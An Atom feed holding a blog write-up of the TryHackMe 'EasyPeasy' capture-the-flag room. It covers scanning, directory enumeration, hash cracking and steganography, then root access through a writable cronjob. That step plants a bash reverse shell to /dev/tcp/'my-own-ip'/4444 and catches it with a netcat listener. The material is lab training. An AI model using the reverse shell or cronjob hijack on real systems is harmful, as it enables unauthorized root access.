<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2020-10-27T12:56:57+01:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Zebra Blog</title><subtitle>'This is a Blog about #CTFs, #WriteUps, #Pen-Testing and #Programming.'</subtitle><author><name>{&quot;social&quot;=&gt;{&quot;github&quot;=&gt;&quot;zebra777&quot;}}</name></author><entry><title type="html">EasyPeasy on Tryhackme</title><link href="http://localhost:4000/writeup/thm" rel="alternate" type="text/html" title="EasyPeasy on Tryhackme" /><published>2020-10-27T09:22:00+01:00</published><updated>2020-10-27T09:22:00+01:00</updated><id>http://localhost:4000/writeup/zebratest</id><content type="html" xml:base="http://localhost:4000/writeup/thm">&lt;p&gt;&lt;img src=&quot;/images/easypeasy.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://tryhackme.com/room/easypeasyctf&quot;&gt;THM EasyPeasy Link&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&quot;easypeasy-writeup&quot;&gt;EasyPeasy WriteUp&lt;/h1&gt;
&lt;h2 id=&quot;by-zebra&quot;&gt;by Zebra&lt;/h2&gt;

&lt;blockquote&gt;

  &lt;p&gt;*Platform	: Tryhackme &lt;br /&gt;
*Difficulty	: Easy&lt;br /&gt;
*OS		  	: Linux&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;

    &lt;p&gt;Challenge Tags:
#encryption, #hash cracking, #file extraction, #reverse shell,&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;
&lt;h3 id=&quot;tasks&quot;&gt;&lt;ins&gt;Tasks&lt;/ins&gt;&lt;/h3&gt;

&lt;p&gt;Task 1.1: How many ports are open?&lt;br /&gt;
Task 1.2: What is the version of nginx?&lt;br /&gt;
Task 1.3: What is running on the highest port?&lt;br /&gt;
Task 2.1: Using GoBuster, find flag 1.                                                           &lt;br /&gt;
Task 2.2: Further enumerate the machine, what is flag 2?&lt;br /&gt;
Task 2.3: Crack the hash with easypeasy.txt, What is the flag 3?&lt;br /&gt;
Task 2.4: What is the hidden directory?&lt;br /&gt;
Task 2.5: Using the wordlist that provided to you in this task crack the hash
		  what is the password?                                                  &lt;br /&gt;
Task 2.6: What is the password to login to the machine via SSH?&lt;br /&gt;
Task 2.7: What is the user flag?&lt;br /&gt;
Task 2.8: What is the root flag?&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;&lt;ins&gt;Introduction&lt;/ins&gt;&lt;/h2&gt;

&lt;p&gt;Hello and welcome to the Write-Up of the Room “Easy Peasy” on 
tryhackme.&lt;br /&gt;
First i make some directories for better structure.&lt;br /&gt;
Then I check the Task, which I had to solve.&lt;br /&gt;
We see, that with have a little red line to get the user and root flag.
Our Steps are:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Scanning and Enumeration&lt;/li&gt;
  &lt;li&gt;Exploitation&lt;/li&gt;
  &lt;li&gt;Post Exploitation&lt;/li&gt;
  &lt;li&gt;Priv Escalation&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;So let’s begin:&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;preparation-steps&quot;&gt;&lt;ins&gt;Preparation Steps&lt;/ins&gt;&lt;/h2&gt;

&lt;blockquote&gt;

  &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;EasyPeasy &lt;span class=&quot;c&quot;&gt;#New Room folder&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;EasyPeasy   	&lt;span class=&quot;c&quot;&gt;#Move into folder&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;nmap  	&lt;span class=&quot;c&quot;&gt;#Nmap directory&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;gobuster  &lt;span class=&quot;c&quot;&gt;#Gobuster directory&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
  &lt;p&gt;&lt;strong&gt;Important: Download under Task 2 the “easypeasy.txt”!!!&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;scanning-and-enumeration&quot;&gt;&lt;ins&gt;Scanning and Enumeration&lt;/ins&gt;&lt;/h2&gt;

&lt;p&gt;This time i user Rustscan. Rustscan is a bit faster then nmap, cause 
first it scans the open ports and do a port list and then it initialize the
specific scans.&lt;/p&gt;

&lt;p&gt;&lt;ins&gt;Rustscan&lt;/ins&gt;&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rustscan 10.10.144.140 -- -A | tee ./nmap/rust_initial.txt&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;

  &lt;p&gt;PORT      STATE SERVICE REASON  VERSION&lt;br /&gt;
80/tcp    open  http    syn-ack nginx 1.16.1&lt;br /&gt;
| http-methods: &lt;br /&gt;
|_  Supported Methods: GET HEAD&lt;br /&gt;
| http-robots.txt: 1 disallowed entry &lt;br /&gt;
|&lt;em&gt;/&lt;br /&gt;
|_http-server-header: nginx/1.16.1&lt;br /&gt;
|_http-title: Welcome to nginx!&lt;br /&gt;
6498/tcp  open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)&lt;br /&gt;
65524/tcp open  http    syn-ack Apache httpd 2.4.43 ((Ubuntu))&lt;br /&gt;
| http-methods: &lt;br /&gt;
|&lt;/em&gt;  Supported Methods: POST OPTIONS HEAD GET&lt;br /&gt;
| http-robots.txt: 1 disallowed entry &lt;br /&gt;
|_/&lt;br /&gt;
|_http-server-header: Apache/2.4.43 (Ubuntu)&lt;br /&gt;
|_http-title: Apache2 Debian Default Page: It works&lt;br /&gt;
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We see that we have 3 Ports on the board whit different hints.&lt;br /&gt;
This would be shown cause of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$nmap -sC #Script detection&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-sV #Version detection&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-O #Os detection&lt;/code&gt;
(for the inclusion of all these switches use $nmap -A)&lt;/p&gt;
&lt;blockquote&gt;

  &lt;p&gt;&lt;ins&gt;2 x Webserver:&lt;/ins&gt;&lt;br /&gt;
80/tcp - Nginx 1.16.1; robots.txt;&lt;br /&gt;
65524/tcp - Apache 2.4.43;&lt;/p&gt;

  &lt;p&gt;&lt;ins&gt;1x ssh:&lt;/ins&gt;&lt;br /&gt;
6498/tcp,With Priv Keys;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;###
&lt;strong&gt;Task 1.1 -1.3 solved&lt;/strong&gt;
###&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;webserver-enumeration&quot;&gt;&lt;ins&gt;Webserver Enumeration&lt;/ins&gt;&lt;/h2&gt;

&lt;p&gt;We found 2 web-servers so we could run our standard procedures
for webserver enumeration:&lt;/p&gt;

&lt;h3 id=&quot;server-on-port-80&quot;&gt;&lt;ins&gt;#Server on Port 80:&lt;/ins&gt;&lt;/h3&gt;

&lt;p&gt;Check the robots.txt:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Nothing interesting.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;ins&gt;So start a Gobuster Scan:&lt;/ins&gt;&lt;br /&gt;
For this operation i often use the common.txt or the small to medium directory list of standard kali wordlists.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster dir -u http://'machine-ip' -w /usr/share/dirb/wordlists/common.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;→ We find the directory &lt;strong&gt;“/hidden”&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;

  &lt;p&gt;So go to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://ip/hidden&lt;/code&gt; and check the Page. Put Ctrl+U for Check the Source-Code of the
Page. But nothing interesting there.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We start another Gobuster scan on &lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster dir -u http://'machine-ip/hidden -w /usr/share/dirb/wordlists/common.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;→ Check! Another directory called &lt;strong&gt;“/whatever”&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;

  &lt;p&gt;If you have a look to your taskbar you see the title “dead end”. This could be a hint for
another gobuster scan on /hidden/whatever.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;But before we leave, lets check the source code again.&lt;/p&gt;

&lt;p&gt;→ Check: &lt;strong&gt;“&amp;lt;p hidden&amp;gt;ZmxhZ3tmMXJzN19mbDRnfQ==&amp;lt;/p&amp;gt;”&lt;/strong&gt; would give us an interesting
string which ends with ==.&lt;/p&gt;
&lt;blockquote&gt;

  &lt;p&gt;“==” is often a base64 string.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We could decode this with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo -e ZmxhZ3tmMXJzN19mbDRnfQ== | base64 -d&lt;/code&gt;&lt;br /&gt;
(You could check the string on “Cyberchef” too).&lt;/p&gt;

&lt;p&gt;###&lt;br /&gt;
&lt;strong&gt;Task 2.1 solved&lt;/strong&gt;&lt;br /&gt;
###&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;checking-the-pictures&quot;&gt;&lt;ins&gt;Checking the pictures:&lt;/ins&gt;&lt;/h2&gt;

&lt;p&gt;Let’s download the two pictures: &lt;br /&gt;
One from /hidden and the another from /hidden/whatever
to check if there any hidden files in the images.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget “and the picture links in the source code&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Check with steghide:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;steghide extract -sf image.jpg&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;

  &lt;p&gt;→ Both need password and we don’t have one. So put this away to don’t lost time.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We don’t have any hints so the second webserver will be our target&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;webserver-on-port-65524&quot;&gt;&lt;ins&gt;Webserver on port &lt;b&gt;65524&lt;/b&gt;&lt;/ins&gt;&lt;/h2&gt;

&lt;p&gt;Visit http://ip:65524/robots.txt&lt;/p&gt;

&lt;p&gt;We find:&lt;/p&gt;

&lt;p&gt;→ User-Agent:a18672860d0510e5ab6699730763b250&lt;/p&gt;
&lt;blockquote&gt;

  &lt;p&gt;This Flag Can Enter But Only This Flag No More Exceptions
Alway when i find a string i check if it could be a hash.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;ins&gt;Check for hash:&lt;/ins&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hash-identifier and check “a18672860d0510e5ab6699730763b250”&lt;/code&gt;&lt;/p&gt;

&lt;center&gt;&lt;p&gt;&lt;img src=&quot;/images/easypeasy_hash1.png&quot; /&gt;&lt;/p&gt;&lt;/center&gt;

&lt;blockquote&gt;

  &lt;p&gt;Its an MD5 hash.&lt;br /&gt;
Crack it. I try it with hashcat but i get nothing. Some googling around i solved it with
MD5hashing and get flag.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;###&lt;br /&gt;
&lt;strong&gt;Task 2.2 solved&lt;/strong&gt;&lt;br /&gt;
###&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;The following step after robots.txt is, checking the actual page and the source code.  &lt;br /&gt;
If we look through the code and search for words like “username”,”user”, “password”, “pass”
and “flag”.&lt;/p&gt;

&lt;p&gt;→ We find the flag for Task 2.3&lt;/p&gt;

&lt;p&gt;###  &lt;br /&gt;
&lt;strong&gt;Task 2.3 solved&lt;/strong&gt;&lt;br /&gt;
###&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;When we think about our first website Scanning we recognized that a hidden file was
placed between a string called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;p hidden&amp;gt;&lt;/code&gt; so we will search for this to.&lt;/p&gt;

&lt;p&gt;→ And check! &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;p hidden&amp;gt;its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu&amp;lt;/p&amp;gt;&lt;/code&gt;.  &lt;br /&gt;
   We find “ba….:ObsJmP173N2X6dOrAgEAL0Vu”.&lt;/p&gt;

&lt;blockquote&gt;

  &lt;p&gt;And what we will do, when we find a string?!   &lt;br /&gt;
Check for decryption. We se “bas….:” so it could be a “base..” format.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Check on Cyberchef.&lt;/p&gt;
&lt;blockquote&gt;

  &lt;p&gt;Put in the string “ObsJmP173N2X6dOrAgEAL0Vu” and try all “from base..”.
You get a hit and find the hidden directory.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;center&gt;&lt;p&gt;&lt;img src=&quot;/images/easypeasy_cyber1.png&quot; /&gt;&lt;/p&gt;&lt;/center&gt;

&lt;p&gt;###  &lt;br /&gt;
&lt;strong&gt;Task 2.4 solved&lt;/strong&gt;&lt;br /&gt;
###&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Visit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://ip:65542/n0**********&lt;/code&gt; and check source code.&lt;/p&gt;

&lt;p&gt;→ We see that there are two .jpg files. One with no link out of the internet and the name
“binarycodepixabay.jpg”. &lt;strong&gt;Download this with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;But another interesting thing there. Another long &lt;strong&gt;string&lt;/strong&gt; under the jpg.&lt;/p&gt;

&lt;blockquote&gt;

  &lt;p&gt;Same procedure with every string -&amp;gt; identify&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hash-identifier : SHA-256&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;

  &lt;p&gt;Crack with MD5hashing; with hashcat no fast chance.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;###  &lt;br /&gt;
&lt;strong&gt;Task 2.5 solved&lt;/strong&gt;&lt;br /&gt;
###&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;ins&gt;Extract with steghide&lt;/ins&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;steghide extract -sf image.jpg&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Use the password we find in Task 2.5.&lt;/p&gt;
&lt;blockquote&gt;

  &lt;p&gt;Why this? Cause the string was on the same page and under the jpp image.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;→ We get a secrettext.txt file with content.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Username: Boring&lt;/code&gt;&lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Password: Binary code&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;

  &lt;p&gt;Crack Binary to ascii.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Use Cyberchef or use &lt;br /&gt;
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo -e binary code without spaces” | perl -lpe '$_=pack&quot;B*&quot;,$_'&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;###  &lt;br /&gt;
&lt;strong&gt;Task 2.6 solved&lt;/strong&gt;&lt;br /&gt;
###&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;In Task 2.6 we had &lt;strong&gt;credentials for ssh&lt;/strong&gt;:&lt;/p&gt;
&lt;blockquote&gt;

  &lt;p&gt;shh with specific Port (find with rustscan)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh boring@IP -p 6498&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;

  &lt;p&gt;Grep the userfile with $ls and $cat user.txt&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;###  &lt;br /&gt;
&lt;strong&gt;Task 2.6 solved&lt;/strong&gt;&lt;br /&gt;
###&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;priv-escalation-enumeration&quot;&gt;&lt;ins&gt;Priv Escalation Enumeration&lt;/ins&gt;&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;nothing&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$find / -perm -u=s -type f 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;nothing&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat /etc/crontab&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;→ Check: .mysecretcronjob.sh&lt;/p&gt;

&lt;p&gt;&lt;ins&gt;Privesc with cronjob:&lt;/ins&gt;&lt;/p&gt;

&lt;p&gt;We find the cronjob with /var/www/.mysecretcronjob.sh.&lt;br /&gt;
Place a &lt;strong&gt;reverse shell&lt;/strong&gt; with nano.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/'my-own-ip'/4444 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;ins&gt;Start listener and wait&lt;/ins&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lnvp 4444&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;

  &lt;p&gt;(You can check if the .sh works with ./.mysecretcronjob.sh.&lt;br /&gt;
But it will be only a normal shell cause boring executed it)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;→ Check: ROOT Shell&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat /root/root.txt&lt;/code&gt;
Last Task 2.8 with root.txt&lt;/p&gt;

&lt;p&gt;###  &lt;br /&gt;
&lt;strong&gt;Task 2.7 solved&lt;/strong&gt;&lt;br /&gt;
###&lt;/p&gt;

&lt;blockquote&gt;

  &lt;p&gt;Summery: For the most of the hash cracking operations at tryhackme or hackthebox
I use the cracking pages at the internet. Because other users can crack the password
before and you saved a lot of time and resources. In any machines you cannot solve
the cracking operation with a specific password list or brute force over a long time.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So here are some links for cracking sites:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://crackstation.net/&quot;&gt;Crackstation&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://www.tunnelsup.com/hash-analyzer/&quot;&gt;Hash-analyzer&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;Cyberchef&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://md5hashing.net/&quot;&gt;MD5 hasching&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;</content><author><name>{&quot;social&quot;=&gt;{&quot;github&quot;=&gt;&quot;zebra777&quot;}}</name></author><category term="writeup" /><category term="thm" /><summary type="html"></summary></entry></feed>